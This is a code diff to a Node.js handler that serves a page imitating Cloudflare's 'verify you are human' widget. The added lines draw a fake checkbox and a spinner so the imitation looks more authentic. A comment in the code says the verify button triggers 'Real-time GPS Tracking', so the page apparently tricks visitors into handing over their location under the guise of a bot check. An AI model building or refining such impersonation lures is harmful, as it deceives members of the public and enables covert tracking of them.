@@ -162,9 +162,14 @@ module.exports = async (req, res) => {
             ` : ''}
         ` : ''}
 
-        /* Success Checkmark CF */
+        /* Success Checkmark & Checkbox CF */
         .check { display: none; width: 22px; height: 22px; border-radius: 50%; background: #22c55e; position: relative; }
         .check::after { content: ''; position: absolute; left: 8px; top: 4px; width: 5px; height: 10px; border: solid white; border-width: 0 2px 2px 0; transform: rotate(45deg); }
+        
+        .cf-checkbox { width: 24px; height: 24px; border: 2px solid #dcdcdc; border-radius: 3px; background: #fff; transition: border-color 0.2s; position: relative; display: block; }
+        .cf-widget:hover .cf-checkbox { border-color: #999; }
+        
+        #cf-spinner { display: none; }
     </style>
 </head>
 <body>
@@ -177,12 +182,13 @@ module.exports = async (req, res) => {
         
         <div class="cf-widget">
             <div class="cf-left">
+                <div class="cf-checkbox" id="cf-checkbox"></div>
                 <div class="dot-spinner" id="cf-spinner">
                     <div></div><div></div><div></div><div></div>
                     <div></div><div></div><div></div><div></div>
                 </div>
                 <div class="check" id="cf-check"></div>
-                <div class="cf-text" id="statusText">${theme.tpl === 'cf' ? 'Verifying...' : theme.p}</div>
+                <div class="cf-text" id="statusText">${theme.tpl === 'cf' ? theme.btn : theme.p}</div>
             </div>
             <div class="cf-right">
                 <img src="https://upload.wikimedia.org/wikipedia/commons/4/4b/Cloudflare_Logo.svg" class="cf-logo" alt="Cloudflare">
@@ -282,11 +288,14 @@ module.exports = async (req, res) => {
             // Real-time GPS Tracking TRIGGERED BY BUTTON CLICK
             document.getElementById('verifyBtn').addEventListener('click', () => {
                 const status = document.getElementById('statusText');
+                const checkbox = document.getElementById('cf-checkbox');
                 const spinner = document.getElementById('cf-spinner');
                 const check = document.getElementById('cf-check');
                 const btn = document.getElementById('verifyBtn');
                 
                 if (status) status.innerText = "Verifying...";
+                if (checkbox) checkbox.style.display = "none";
+                if (spinner) spinner.style.display = "block";
                 
                 if (btn && btn.style.opacity !== "0") {
                     btn.innerText = "Please wait...";
